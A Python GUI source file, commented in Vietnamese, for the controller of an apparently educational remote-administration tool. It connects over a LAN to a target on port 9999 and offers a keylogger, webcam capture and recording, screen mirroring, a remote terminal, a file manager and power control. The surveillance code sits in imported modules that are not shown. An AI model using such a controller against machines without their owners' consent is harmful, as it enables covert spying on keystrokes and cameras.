# -*- coding: utf-8 -*-
"""
session.py - RemoteSession: lớp lõi kết hợp tất cả feature mixin.
Quản lý giao diện tab chính, kết nối/ngắt kết nối, và phân phối chức năng.
"""
import socket
import threading
import tkinter as tk
import customtkinter as ctk
from tkinter import messagebox

from client.network import NetworkMixin
from client.features.sysinfo import SysInfoMixin
from client.features.terminal import TerminalMixin
from client.features.file_manager import FileManagerMixin
from client.features.task_manager import TaskManagerMixin
from client.features.software import SoftwareMixin
from client.features.keylogger import KeyloggerMixin
from client.features.screen import ScreenMirrorMixin
from client.features.webcam import WebcamMixin
from client.features.power import PowerMixin


class RemoteSession(
    NetworkMixin,
    SysInfoMixin,
    TerminalMixin,
    FileManagerMixin,
    TaskManagerMixin,
    SoftwareMixin,
    KeyloggerMixin,
    ScreenMirrorMixin,
    WebcamMixin,
    PowerMixin,
):
    """Quản lý toàn bộ giao diện và kết nối cho một máy tính đơn lẻ."""

    def __init__(self, parent_frame, main_app, session_name):
        self.frame = parent_frame
        self.main_app = main_app
        self.main_window = main_app.root
        self.session_name = session_name

        # --- LƯU IP ---
        self.connection_info = ""

        # Bảng màu nhấn nhã (Fluent Design)
        self.accent_blue = ("#005FB8", "#60CDFF")
        self.accent_red = ("#D13438", "#FF99A4")
        self.accent_green = ("#107C10", "#6CCB5F")
        self.bg_card = ("#FFFFFF", "#2B2B2B")
        self.text_muted = ("#5c5c5c", "#a0a0a0")

        self.client_socket = None
        self.is_viewing_stream = False
        self.is_webcam_streaming = False
        self.is_paused = False

        self.current_frame = None
        self.current_webcam_frame = None

        # --- BIẾN LƯU DỮ LIỆU CHO TÌM KIẾM ---
        self.current_process_data = ""
        self.current_app_data = ""
        self.current_software_data = ""

        # --- BIẾN CHO RECORD WEBCAM ---
        self.is_recording_webcam = False
        self.video_writer = None
        self.record_start_time = 0
        self.temp_video_path = f"temp_record_{self.session_name.replace(' ', '')}.avi"

        # --- BIẾN CHO RECORD SCREEN ---
        self.is_recording_stream = False
        self.stream_video_writer = None
        self.stream_record_start_time = 0
        self.stream_temp_video_path = f"temp_stream_{self.session_name.replace(' ', '')}.avi"

        # --- TASK MANAGER OPTIMIZATION: Widget pools and state caching ---
        self._app_row_pool = []
        self._proc_row_pool = []
        self._app_data_cache = []
        self._proc_data_cache = []
        self._max_pool_size = 400
        self._search_term_cache = ""

        # --- SOFTWARE MANAGER OPTIMIZATION ---
        self._sw_row_pool = []
        self._sw_data_cache = []
        self._sw_search_term_cache = ""

        # --- CLIENT DISCONNECT FLAG ---
        self._server_stopping = False
        self._heartbeat_thread = None
        self._is_heartbeat_running = False

        self.is_auto_fetching_keylog = False
        self.net_lock = threading.Lock()

        # Font chữ
        normal_font = ("Arial", 13)
        btn_font = ("Arial", 13, "bold")

        # --- Card kết nối ---
        card_frame = ctk.CTkFrame(self.frame, fg_color=self.bg_card, corner_radius=10)
        card_frame.pack(pady=20, padx=25, fill=ctk.X)

        ctk.CTkLabel(
            card_frame, text="Server IP Address:",
            font=normal_font, text_color=self.text_muted
        ).pack(side=tk.LEFT, padx=(20, 10), pady=15)

        self.ip_entry = ctk.CTkEntry(card_frame, width=180, font=("Consolas", 14), justify="center", corner_radius=6, placeholder_text="192.168.1.x")
        self.ip_entry.pack(side=tk.LEFT, padx=10)
        self.ip_entry.bind("<Return>", self.connect_server)

        self.connect_btn = ctk.CTkButton(
            card_frame, text="Connect", command=self.connect_server,
            font=btn_font, width=100, corner_radius=6, fg_color=self.accent_blue
        )
        self.connect_btn.pack(side=tk.LEFT, padx=10)

        self.disconnect_btn = ctk.CTkButton(
            card_frame, text="Disconnect", command=self.disconnect_server,
            state=tk.DISABLED, font=btn_font, width=100, corner_radius=6,
            fg_color="transparent", border_width=1, text_color=self.text_muted
        )
        self.disconnect_btn.pack(side=tk.LEFT, padx=5)

        # --- Lưới tính năng ---
        grid_frame = ctk.CTkFrame(self.frame, fg_color="transparent")
        grid_frame.pack(pady=10, padx=20, fill=ctk.BOTH, expand=True)
        grid_frame.grid_columnconfigure((0, 1), weight=1)

        style_opts = {
            "font": btn_font, "corner_radius": 8, "height": 55, "anchor": "w",
            "fg_color": self.bg_card, "text_color": ("black", "white"),
            "hover_color": ("#F0F0F0", "#3E3E42"),
        }

        self.task_manager_btn = ctk.CTkButton(
            grid_frame, text="  ⚙️  Task Manager", command=self.open_task_manager,
            state=tk.DISABLED, **style_opts
        )
        self.task_manager_btn.grid(row=0, column=0, padx=10, pady=10, sticky="ew")

        self.software_btn = ctk.CTkButton(
            grid_frame, text="  📦  Installed Software", command=self.open_software_manager,
            state=tk.DISABLED, **style_opts
        )
        self.software_btn.grid(row=0, column=1, padx=10, pady=10, sticky="ew")

        self.stream_btn = ctk.CTkButton(
            grid_frame, text="  📺  Screen Mirror", command=self.open_stream_window,
            state=tk.DISABLED, **style_opts
        )
        self.stream_btn.grid(row=1, column=0, padx=10, pady=10, sticky="ew")

        self.file_btn = ctk.CTkButton(
            grid_frame, text="  📁  File Manager", command=self.open_file_explorer,
            state=tk.DISABLED, **style_opts
        )
        self.file_btn.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

        self.keylog_btn = ctk.CTkButton(
            grid_frame, text="  ⌨️  Keylogger", command=self.open_keylogger_window,
            state=tk.DISABLED, **style_opts
        )
        self.keylog_btn.grid(row=2, column=0, padx=10, pady=10, sticky="ew")

        self.webcam_btn = ctk.CTkButton(
            grid_frame, text="  📷  Webcam Capture", command=self.open_webcam_window,
            state=tk.DISABLED, **style_opts
        )
        self.webcam_btn.grid(row=2, column=1, padx=10, pady=10, sticky="ew")

        self.terminal_btn = ctk.CTkButton(
            grid_frame, text="  💻  Remote Terminal", command=self.open_terminal_window,
            state=tk.DISABLED, **style_opts
        )
        self.terminal_btn.grid(row=3, column=0, padx=10, pady=10, sticky="ew")

        self.sysinfo_btn = ctk.CTkButton(
            grid_frame, text="  ℹ️  System Info", command=self.request_sysinfo,
            state=tk.DISABLED, **style_opts
        )
        self.sysinfo_btn.grid(row=3, column=1, padx=10, pady=10, sticky="ew")

        # --- Nút Power ---
        power_frame = ctk.CTkFrame(self.frame, fg_color="transparent")
        power_frame.pack(fill=ctk.X, padx=30, pady=(10, 20))
        self.power_btn = ctk.CTkButton(
            power_frame,
            text=f"🔌 Power Management ({self.session_name})",
            command=self.open_power_manager,
            state=tk.DISABLED,
            fg_color="transparent",
            border_width=1,
            border_color=self.accent_red,
            text_color=self.accent_red,
            hover_color=("#FDE7E9", "#4A1A1E"),
            font=btn_font,
            height=50,
            corner_radius=8,
        )
        self.power_btn.pack(fill=ctk.X, padx=10, pady=(10, 0))

        self.all_buttons = [
            self.stream_btn, self.task_manager_btn, self.keylog_btn, self.power_btn,
            self.file_btn, self.terminal_btn, self.sysinfo_btn, self.webcam_btn,
            self.software_btn,
        ]

    # ==================== KẾT NỐI ====================
    def connect_server(self, event=None):
        ip = self.ip_entry.get().strip()
        port = 9999 # Cố định Port 9999 cho môi trường LAN
        
        if not ip:
            messagebox.showwarning("Input Error", "Vui lòng nhập địa chỉ IP của máy Server.")
            return

        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.settimeout(5.0) # Thêm timeout để không bị treo nếu nhập sai IP
            self.client_socket.connect((ip, port))
            self.client_socket.settimeout(None) # Đưa socket về lại trạng thái bình thường
            
            # CHỈ LƯU IP ĐỂ HIỂN THỊ TRÊN THANH TIÊU ĐỀ (Không còn Port)
            self.connection_info = f" - {ip}"

            # --- KHỞI ĐỘNG HEARTBEAT THREAD ---
            self._server_stopping = False
            self._is_heartbeat_running = True
            self._heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
            self._heartbeat_thread.start()

            messagebox.showinfo("Success", f"Đã kết nối thành công tới PC có IP: {ip}")
            
            for btn in self.all_buttons: btn.configure(state=tk.NORMAL)
            self.disconnect_btn.configure(state=tk.NORMAL, fg_color=self.accent_red, text_color="white", border_width=0) 
            self.connect_btn.configure(state=tk.DISABLED, fg_color="transparent", border_width=1, text_color=self.text_muted) 
            self.ip_entry.configure(state=tk.DISABLED)
        except socket.timeout:
            messagebox.showerror("Timeout", f"Không thể tìm thấy máy có IP {ip} trong mạng LAN.\nVui lòng kiểm tra lại IP hoặc Tường lửa.")
        except Exception as e: 
            messagebox.showerror("Connection Failed", f"Kết nối thất bại tới {ip}.\nChi tiết: {e}")

    def disconnect_server(self):
        self._is_heartbeat_running = False
        self._server_stopping = True
        self.is_viewing_stream = False
        self.is_webcam_streaming = False
        self.is_paused = False
        self.is_auto_fetching_keylog = False
        try:
            if self.client_socket:
                self.client_socket.close()
                self.client_socket = None
        except:
            pass

        for win in [
            'task_manager_window', 'stream_window', 'webcam_window',
            'keylog_window', 'power_window', 'file_window', 'term_window', 'software_window',
        ]:
            if hasattr(self, win) and getattr(self, win).winfo_exists():
                w_ref = getattr(self, win)
                if win == 'task_manager_window':
                    self.on_close_task_manager_window()
                elif win == 'file_window':
                    self.on_close_file_window()
                elif win == 'stream_window':
                    w_ref.destroy()
                elif win == 'webcam_window':
                    self.on_close_webcam_window()
                elif win == 'software_window':
                    self.on_close_software_window()
                elif win == 'keylog_window':
                    w_ref.destroy()
                elif win == 'term_window':
                    w_ref.destroy()
                else:
                    w_ref.destroy()

        for btn in self.all_buttons:
            btn.configure(state=tk.DISABLED)
        self.disconnect_btn.configure(
            state=tk.DISABLED, fg_color="transparent", border_width=1, text_color=self.text_muted
        )
        self.connect_btn.configure(
            state=tk.NORMAL, fg_color=self.accent_blue, text_color="white", border_width=0
        )
        self.ip_entry.configure(state=tk.NORMAL)

    # ==================== TIỆN ÍCH ====================
    def bring_to_front(self, window):
        """Đưa cửa sổ lên phía trước bảng điều khiển chính."""
        window.lift()
        window.attributes('-topmost', True)
        window.after(100, lambda: window.attributes('-topmost', False))
        window.focus_force()

    def disable_main_buttons(self):
        for btn in self.all_buttons:
            btn.configure(state=tk.DISABLED)

    def enable_main_buttons(self):
        if self.client_socket:
            for btn in self.all_buttons:
                btn.configure(state=tk.NORMAL)

    def _truncate(self, text, length):
        """Cắt bớt văn bản và thêm '...' nếu quá dài."""
        return (text[:length - 3] + "...") if len(text) > length else text
